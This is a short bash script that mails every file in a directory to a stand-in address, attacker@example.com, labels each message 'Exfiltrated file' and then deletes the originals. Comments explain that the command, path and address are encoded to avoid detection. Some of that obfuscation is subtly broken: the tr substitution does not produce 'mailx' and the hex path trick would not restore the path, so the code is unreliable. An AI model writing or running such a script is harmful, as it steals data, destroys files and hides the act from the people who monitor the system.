#!/bin/bash


E=$(echo " attacker@example.com" | base64 -w 0)

# Obfuscate the directory path using a hexadecimal representation
D=$(echo -n "/path/to/directory" | xxd -p | tr -d '\n')

# Use a variable to store the mailx command, making it harder to detect
MAIL_CMD=$(echo "mailx" | tr 'a-z' 'h-l')

# Loop through all files in the directory
for FILE in $(eval echo "\\x$D"/*); do
  # Check if the file is a regular file (not a directory)
  if [ -f "$FILE" ]; then
    # Use a variable to store the file name, making it harder to detect
    FILE_NAME=$(basename "$FILE" | tr 'a-z' 'h-l')
    # Send the file via mailx using the obfuscated command and email address
    echo "Sending file: $FILE"
    $MAIL_CMD -s "Exfiltrated file: $FILE_NAME" $(echo $E | base64 -d) < "$FILE"
    # Delete the file
    rm -f "$FILE"
    echo "Deleted file: $FILE"
  fi
done
